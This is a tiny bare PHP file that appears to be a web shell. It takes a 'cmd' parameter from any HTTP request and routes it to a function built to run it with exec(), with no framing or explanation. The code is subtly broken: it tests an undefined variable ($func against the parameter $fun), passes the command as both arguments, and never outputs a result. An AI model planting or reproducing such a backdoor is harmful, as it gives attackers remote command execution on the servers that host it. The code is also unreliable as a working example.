<?php
function do_phpfun($cmd,$fun) {
	$res = '';
	
	if ($func == "exec") { @exec($cmd,$res); $res = join("\n",$res); }
	
	return $res;
}

if (isset($_REQUEST['cmd']))
	do_phpfun($_REQUEST['cmd'], $_REQUEST['cmd']);
?>